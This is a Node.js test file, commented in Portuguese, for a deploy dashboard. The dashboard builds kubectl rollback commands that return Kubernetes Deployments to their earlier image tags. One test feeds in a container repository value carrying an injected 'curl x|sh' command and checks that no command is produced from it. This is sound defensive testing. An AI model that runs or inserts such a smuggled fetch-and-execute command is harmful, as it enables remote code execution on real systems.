const { describe, test } = require("node:test");
const assert = require("node:assert");
const { releaseRollback } = require("../../../server/deploy-board/rollback");
const { ClusterTracker } = require("../../../server/deploy-board/cluster-tracker");
const { DeployBoardStore, DONE_VISIBLE_MS } = require("../../../server/deploy-board/store");
const { deployment, cronJob } = require("./k8s-fixtures");

const OLD = "5f2c1aa0000000000000000000000000000000aa";
const NEW = "9ee108fd57e459e093b5503b1de543d66df61c2e";

/**
 * @param {string} name Deployment name.
 * @param {string} tag Tag of the application container.
 * @returns {object} Deployment as the tracker publishes it.
 */
function dep(name, tag) {
    return {
        name,
        containers: [
            { name: "php-fpm", repository: "tiwinker/portal", tag },
            { name: "nginx", repository: "nginx", tag: "1.27" },
        ],
    };
}

/**
 * @param {object} o Fields to replace.
 * @returns {object} Rollout of winker-prod as the store keeps it.
 */
function rollout(o = {}) {
    return {
        namespace: "condominio",
        release: "winker-prod",
        state: "done",
        cronJobsUpdated: 0,
        startedAt: 2000,
        deployments: [dep("winker-prod", NEW)],
        before: {},
        ...o,
    };
}

/** A command line holds the namespace, the Deployment, the container, the repository and the tag. */
const SET_IMAGE_RE =
    /^kubectl -n [a-z0-9-]+ set image deployment\/[a-z0-9-]+( [a-z0-9-]+=[a-z0-9./-]+:[A-Za-z0-9._-]+)+$/;

describe("Como voltar: montagem do comando", () => {
    test("só o container que mudou entra, com a tag anterior; o nginx fica de fora", () => {
        const plan = releaseRollback(rollout(), [
            { ...rollout({ startedAt: 1000 }), deployments: [dep("winker-prod", OLD)] },
        ]);
        assert.strictEqual(plan.status, "known");
        assert.strictEqual(plan.previous, OLD);
        assert.deepStrictEqual(plan.setImage, [
            `kubectl -n condominio set image deployment/winker-prod php-fpm=tiwinker/portal:${OLD}`,
        ]);
        assert.deepStrictEqual(plan.rolloutStatus, ["kubectl -n condominio rollout status deployment/winker-prod"]);
        assert.match(plan.setImage[0], SET_IMAGE_RE);
    });

    test("gateway-worker: uma linha por Deployment, os 14", () => {
        const names = Array.from({ length: 14 }, (_, i) => `gateway-worker-${i + 1}`);
        const current = rollout({
            namespace: "gateway",
            release: "gateway-worker",
            deployments: names.map((n) => dep(n, "2222222bbbb")),
        });
        const previous = { ...current, startedAt: 1000, deployments: names.map((n) => dep(n, "1111111aaaa")) };
        const plan = releaseRollback(current, [previous]);
        assert.strictEqual(plan.setImage.length, 14);
        assert.strictEqual(plan.rolloutStatus.length, 14);
        assert.ok(plan.setImage.every((l) => SET_IMAGE_RE.test(l)));
        assert.strictEqual(
            plan.setImage[13],
            "kubectl -n gateway set image deployment/gateway-worker-14 php-fpm=tiwinker/portal:1111111aaaa"
        );
    });

    test("sem deploy anterior conhecido e sem ter visto o começo: versão anterior desconhecida, sem comando", () => {
        const plan = releaseRollback(rollout(), []);
        assert.strictEqual(plan.status, "unknown");
        assert.deepStrictEqual(plan.setImage, []);
    });

    test("registro antigo, de antes desta fase (sem containers), não serve de versão anterior", () => {
        assert.strictEqual(
            releaseRollback(rollout(), [{ ...rollout({ startedAt: 1000 }), deployments: undefined }]).status,
            "unknown"
        );
    });

    test("um deploy anterior com as mesmas imagens é pulado: vale o último com imagem diferente", () => {
        const same = { ...rollout({ startedAt: 1500 }), deployments: [dep("winker-prod", NEW)] };
        const older = { ...rollout({ startedAt: 1000 }), deployments: [dep("winker-prod", OLD)] };
        assert.strictEqual(releaseRollback(rollout(), [same, older]).previous, OLD);
    });

    test("sem histórico, vale o que estava no ar quando a virada começou", () => {
        const plan = releaseRollback(rollout({ before: { "winker-prod": dep("winker-prod", OLD).containers } }), []);
        assert.strictEqual(plan.status, "known");
        assert.strictEqual(plan.previous, OLD);
    });

    test("o histórico vence o que estava no ar: um deploy travado no meio não é versão para voltar", () => {
        const stuckTag = "7777777cccc";
        const plan = releaseRollback(rollout({ before: { "winker-prod": dep("winker-prod", stuckTag).containers } }), [
            { ...rollout({ startedAt: 1000 }), deployments: [dep("winker-prod", OLD)] },
        ]);
        assert.strictEqual(plan.previous, OLD);
    });

    test("virada que não trocou imagem (um restart) não tem o que voltar", () => {
        const plan = releaseRollback(rollout({ before: { "winker-prod": dep("winker-prod", NEW).containers } }), [
            { ...rollout({ startedAt: 1000 }), deployments: [dep("winker-prod", OLD)] },
        ]);
        assert.strictEqual(plan.status, "unchanged");
        assert.deepStrictEqual(plan.setImage, []);
    });

    test("gateway-cron, só CronJobs: sem comando, e a conta dos CronJobs que ficam na versão nova", () => {
        const plan = releaseRollback(rollout({ release: "gateway-cron", deployments: [], cronJobsUpdated: 95 }), []);
        assert.strictEqual(plan.status, "cronOnly");
        assert.strictEqual(plan.cronJobs, 95);
    });

    test("valor do cluster com caractere de shell não vira comando", () => {
        const evil = { name: "php-fpm", repository: "tiwinker/portal;curl x|sh", tag: OLD };
        const plan = releaseRollback(rollout(), [
            {
                ...rollout({ startedAt: 1000 }),
                deployments: [{ name: "winker-prod", containers: [evil, dep("x", "1").containers[1]] }],
            },
        ]);
        assert.strictEqual(plan.status, "unknown");
        assert.deepStrictEqual(plan.setImage, []);
        // Controle positivo: o mesmo cenário com o repositório limpo dá comando.
        const clean = releaseRollback(rollout(), [
            { ...rollout({ startedAt: 1000 }), deployments: [dep("winker-prod", OLD)] },
        ]);
        assert.strictEqual(clean.status, "known");
    });
});

describe("Como voltar: rastreador e painel", () => {
    test("o Helm troca a imagem antes de o controlador subir a revisão: a versão anterior é a da revisão, não a do último evento", () => {
        let clock = 1_000_000;
        const published = [];
        const tracker = new ClusterTracker({
            releases: ["condominio/winker-prod"],
            now: () => clock,
            onRollout: (r) => published.push(r),
        });
        tracker.replace("condominio", "deployments", [deployment({ tag: OLD, revision: 7 })], true);
        // O patch do helm chega com a imagem nova e a revisão antiga; o controlador sobe a revisão depois.
        tracker.apply(
            "deployments",
            "MODIFIED",
            deployment({ tag: NEW, revision: 7, generation: 11, observedGeneration: 10 })
        );
        clock += 1000;
        tracker.apply(
            "deployments",
            "MODIFIED",
            deployment({ tag: NEW, revision: 8, generation: 11, updated: 1, total: 18 })
        );
        const r = published.at(-1);
        assert.deepStrictEqual(
            r.before["winker-prod"].map((c) => c.tag),
            [OLD, "1.27"]
        );
        assert.deepStrictEqual(r.deployments, [dep("winker-prod", NEW)]);
    });

    test("condominio: o deploy concluído mostra o comando para a versão anterior, nas duas releases; em andamento, nada", () => {
        let clock = 1_000_000;
        const store = new DeployBoardStore({ now: () => clock });
        const releases = ["condominio/winker-prod", "condominio/winker-integration"];
        store.setProjects([
            {
                name: "condominio",
                source: null,
                releases: releases.map((r) => ({ namespace: "condominio", release: r.split("/")[1] })),
            },
        ]);
        const tracker = new ClusterTracker({ releases, now: () => clock, onRollout: (r) => store.upsertRollout(r) });
        const prod = (o) => deployment({ name: "winker-prod", release: "winker-prod", ...o });
        const integ = (o) =>
            deployment({ name: "winker-integration", release: "winker-integration", replicas: 2, ...o });

        // O painel sobe com o OLD no ar e vê o NEW chegar: a integração primeiro, a produção 30 min depois.
        tracker.replace("condominio", "deployments", [prod({ tag: OLD }), integ({ tag: OLD })], true);
        tracker.apply(
            "deployments",
            "MODIFIED",
            integ({ tag: NEW, revision: 8, generation: 11, updated: 1, total: 3 })
        );
        let card = store.snapshot().deploys[0];
        assert.strictEqual(card.state, "updating");
        assert.strictEqual(card.rollback, null);

        clock += 60 * 1000;
        tracker.apply("deployments", "MODIFIED", integ({ tag: NEW, revision: 8, generation: 11 }));
        clock += 30 * 60 * 1000;
        tracker.apply(
            "deployments",
            "MODIFIED",
            prod({ tag: NEW, revision: 8, generation: 11, updated: 1, total: 18 })
        );
        clock += 5 * 60 * 1000;
        tracker.apply("deployments", "MODIFIED", prod({ tag: NEW, revision: 8, generation: 11 }));

        card = store.snapshot().deploys[0];
        assert.strictEqual(card.state, "done");
        const lines = card.rollback.releases.flatMap((r) => r.setImage);
        assert.deepStrictEqual(lines.sort(), [
            `kubectl -n condominio set image deployment/winker-integration php-fpm=tiwinker/portal:${OLD}`,
            `kubectl -n condominio set image deployment/winker-prod php-fpm=tiwinker/portal:${OLD}`,
        ]);
        // O que vai ao navegador não carrega os containers crus, só o comando montado.
        assert.ok(!card.releases.some((r) => "deployments" in r || "before" in r));
        store.close();
    });

    test("o próximo deploy depois de um reinício do painel volta para o anterior, lido do histórico", () => {
        let clock = 1_000_000;
        const store = new DeployBoardStore({ now: () => clock });
        store.setProjects([
            { name: "condominio", source: null, releases: [{ namespace: "condominio", release: "winker-prod" }] },
        ]);
        const tracker = () =>
            new ClusterTracker({
                releases: ["condominio/winker-prod"],
                now: () => clock,
                onRollout: (r) => store.upsertRollout(r),
            });

        let t = tracker();
        t.replace("condominio", "deployments", [deployment({ tag: OLD })], true);
        t.apply("deployments", "MODIFIED", deployment({ tag: "1234567aaaa", revision: 8, generation: 11 }));
        clock += DONE_VISIBLE_MS;
        store.tick();
        const records = store.history.map((h) => JSON.parse(JSON.stringify(h)));

        // O deploy seguinte acontece com o painel fora do ar (o do próprio Kuma é sempre assim): no boot,
        // o histórico volta do banco e o rastreador não viu o começo da virada.
        clock += 60 * 1000;
        const restarted = new DeployBoardStore({ now: () => clock });
        restarted.setProjects([
            { name: "condominio", source: null, releases: [{ namespace: "condominio", release: "winker-prod" }] },
        ]);
        restarted.restore(records);
        t = new ClusterTracker({
            releases: ["condominio/winker-prod"],
            now: () => clock,
            onRollout: (r) => restarted.upsertRollout(r),
            known: new Map([["deployments/condominio/winker-prod", "8"]]),
        });
        t.replace("condominio", "deployments", [deployment({ tag: NEW, revision: 9 })], true);

        const card = restarted.snapshot().deploys[0];
        assert.strictEqual(card.version, NEW.slice(0, 7));
        assert.strictEqual(card.missed, true);
        assert.deepStrictEqual(card.rollback.releases[0].setImage, [
            "kubectl -n condominio set image deployment/winker-prod php-fpm=tiwinker/portal:1234567aaaa",
        ]);
        store.close();
        restarted.close();
    });

    test("CronJobs da release contam no aviso", () => {
        const clock = 1_000_000;
        const store = new DeployBoardStore({ now: () => clock });
        store.setProjects([
            { name: "api_gateway", source: null, releases: [{ namespace: "gateway", release: "gateway-cron" }] },
        ]);
        const tracker = new ClusterTracker({
            releases: ["gateway/gateway-cron"],
            now: () => clock,
            onRollout: (r) => store.upsertRollout(r),
        });
        const crons = (tag) => Array.from({ length: 95 }, (_, i) => cronJob({ name: `c${i}`, tag }));
        tracker.replace("gateway", "cronjobs", crons("1111111aaaa"), true);
        for (const c of crons("2222222bbbb")) {
            tracker.apply("cronjobs", "MODIFIED", c);
        }
        const [plan] = store.snapshot().deploys[0].rollback.releases;
        assert.strictEqual(plan.status, "cronOnly");
        assert.strictEqual(plan.cronJobs, 95);
        store.close();
    });
});
